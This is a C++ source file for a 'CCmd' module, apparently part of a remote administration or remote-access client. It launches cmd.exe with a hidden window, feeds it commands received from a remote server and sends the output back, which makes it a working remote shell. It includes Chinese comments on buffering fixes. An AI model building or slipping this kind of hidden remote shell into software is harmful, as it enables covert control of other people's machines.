#include "Cmd.h"
#include <iostream>

using std::iostream;

CCmd::CCmd(CClient *pClient) :
CEventHandler(pClient,CMD)
{
	m_hReadPipe = NULL;
	m_hWritePipe = NULL;
	m_hReadThread = NULL;
	memset(&m_pi, 0, sizeof(m_pi));
}

CCmd::~CCmd()
{
	dbg_log("CCmd::~CCmd()");
}

/*
	@ Date:		2022 07 11
	@ Modify:	优化解决cmd 行缓冲太慢的问题
	
	
	@ Date: 	2023 11 25
	@ Modify:  优化缓冲问题.
*/

#define PIPE_BUF_SIZE 0x100000

void __stdcall ReadThread(CCmd*pCmd)
{
	CHAR *  lpData = new CHAR[PIPE_BUF_SIZE];
	TCHAR* szOutput = new TCHAR[PIPE_BUF_SIZE];

	char * w_ptr = lpData;
	char * r_ptr = lpData;
	char * end_ptr = lpData + PIPE_BUF_SIZE;

	DWORD dwMsgLength  = 0;
	DWORD dwReadBytes  = 0;
	DWORD dwAvailBytes = 0;
	BOOL  bResult;

	//一次尽可能多地发送数据.
	while (TRUE)
	{
		bResult = ReadFile(
			pCmd->m_hReadPipe,
			w_ptr,
			end_ptr - w_ptr, 
			&dwReadBytes,
			NULL);
		
		//pipe is closed or no data to read.
		if (!bResult || dwReadBytes == 0)
			break;

		w_ptr += dwReadBytes;

		while (TRUE)
		{
			//copy left data to buffer.

			if (0 == (end_ptr - w_ptr))
			{
				int chCnt = MultiByteToWideChar(
					CP_ACP,
					0, 
					r_ptr,
					w_ptr - r_ptr, 
					szOutput, 
					PIPE_BUF_SIZE - 1);
				
				r_ptr = lpData;
				w_ptr = lpData;

				szOutput[chCnt] = 0;

				pCmd->Send(CMD_RESULT, szOutput, (chCnt + 1) * sizeof(TCHAR));
			}

			bResult = PeekNamedPipe(
				pCmd->m_hReadPipe,
				NULL,
				NULL,
				NULL,
				&dwAvailBytes,
				0);

			if (!bResult || dwAvailBytes == 0)
			{
				int chCnt = MultiByteToWideChar(
					CP_ACP,
					0,
					r_ptr,
					w_ptr - r_ptr,
					szOutput,
					PIPE_BUF_SIZE - 1);

				szOutput[chCnt] = 0;
				pCmd->Send(CMD_RESULT, szOutput, (chCnt + 1) * sizeof(TCHAR));

				r_ptr = w_ptr;
				break;
			}
			//
			ReadFile(
				pCmd->m_hReadPipe,
				w_ptr,
				end_ptr - w_ptr,
				&dwReadBytes,
				NULL);

			w_ptr += dwReadBytes;
		}
	}
	pCmd->Close();

	delete []lpData;
	delete []szOutput;
}

#include "utils.h"
#include <TlHelp32.h>


void CCmd::OnClose()
{

#define QUEUE_SIZE 0x100

	//kill process tree.
	DWORD pidQueue[QUEUE_SIZE];
	DWORD head = 0;
	DWORD tail = 0;

	pidQueue[tail] = m_pi.dwProcessId;
	tail = (tail + 1) % QUEUE_SIZE;

	while (head != tail)
	{
		DWORD ppid;
		PROCESSENTRY32 pe    = { sizeof(PROCESSENTRY32) };
		HANDLE         hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
		BOOL           bFind = Process32First(hSnap, &pe);
		
		ppid = pidQueue[head];
		head = (head + 1) % QUEUE_SIZE;

		while (bFind)
		{
			if (pe.th32ParentProcessID == ppid)
			{
				//kill process.
				DWORD pid = pe.th32ProcessID;
				HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
				
				dbg_log("pid : %d", pid);
				if (hProcess)
				{
					TerminateProcess(hProcess, 0);
					CloseHandle(hProcess);
				}

				pidQueue[tail] = pid;
				tail = (tail + 1) % QUEUE_SIZE;
			}
			bFind = Process32Next(hSnap, &pe);
		}

		CloseHandle(hSnap);
	}

	//kill cmd.exe
	TerminateProcess(m_pi.hProcess, 0);
	CloseHandle(m_pi.hProcess);
	CloseHandle(m_pi.hThread);

	//线程ReadFile会结束，等待线程退出。;
	dbg_log("Read File Will read eof,wait Read thread exit.");
	
	if(WAIT_TIMEOUT == WaitForSingleObject(m_hReadThread, 6666))
	{
		TerminateThread(m_hReadThread,0);
		WaitForSingleObject(m_hReadThread, INFINITE);
	}
	
	dbg_log("Read thread exited.");
	CloseHandle(m_hReadThread);
	CloseHandle(m_hReadPipe);
	CloseHandle(m_hWritePipe);
}
void CCmd::OnOpen()
{
	DWORD dwStatu = 0;
	dwStatu = CmdBegin();

	//成功.;
	Send(CMD_BEGIN, (char*)&dwStatu, sizeof(DWORD));

	if (dwStatu == -1)
	{
		Close();
	}
}

void CCmd::OnEvent(UINT32 e, BYTE *lpData, UINT32 Size)
{
	switch (e){
	case CMD_COMMAND:
		OnCommand((TCHAR*)lpData);
		break;
	default:
		break;
	}
}

void CCmd::OnCommand(TCHAR *szCmd)
{
	DWORD dwWrite = 0;
	CHAR  cmd[0x1000];
	DWORD dwLeft = 0;
	BYTE *lpWriteData = (BYTE*)cmd;

	dwLeft = WideCharToMultiByte(CP_ACP, 0, szCmd, lstrlen(szCmd), cmd, 0x1000 - 1, NULL, NULL);

	while(dwLeft>0)
	{
		dwWrite = 0;

		if (!WriteFile(m_hWritePipe, lpWriteData , dwLeft, &dwWrite, NULL))
		{	
			Close();
			break;
		}
		
		lpWriteData += dwWrite;
		dwLeft -= dwWrite;
	}
}
//cmd退出有两种情况:;
//		1.server 关闭	cmd不会退出,需要自己关闭.;
//		2.输入exit.		Read会失败.;

int CCmd::CmdBegin()
{ 
	HANDLE hCmdReadPipe = NULL;
	HANDLE hCmdWritePipe = NULL;
	SECURITY_ATTRIBUTES sa = { 0 };
	STARTUPINFO         si = { 0 };

	TCHAR szCmd[] = TEXT("cmd.exe");

	sa.nLength = sizeof(sa);
	sa.lpSecurityDescriptor = NULL;
	sa.bInheritHandle = TRUE;

	if (FALSE == CreatePipe(&m_hReadPipe, &hCmdWritePipe, &sa, 0))
		return -1;
	
	if (FALSE == CreatePipe(&hCmdReadPipe,&m_hWritePipe,  &sa, 0))
		return -1;

	si.cb = sizeof(si);
	si.wShowWindow = SW_HIDE;
	//si.wShowWindow = SW_SHOW;
	si.hStdError = hCmdWritePipe;
	si.hStdOutput = hCmdWritePipe;
	si.hStdInput = hCmdReadPipe;
	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	
	//
	if (!CreateProcess(
		NULL, 
		szCmd, 
		NULL, 
		NULL, 
		TRUE, 
		NORMAL_PRIORITY_CLASS, 
		NULL, 
		NULL, 
		&si, 
		&m_pi)
	)
	{
		return -1;
	}

	//不需要这两个,直接关掉.;
	CloseHandle(hCmdReadPipe);
	CloseHandle(hCmdWritePipe);

	m_hReadThread = CreateThread(
		NULL,
		0, 
		(LPTHREAD_START_ROUTINE)ReadThread,
		this,
		NULL,
		NULL
	);
	
	if (!m_hReadThread)
		return -1;

	return 0;
}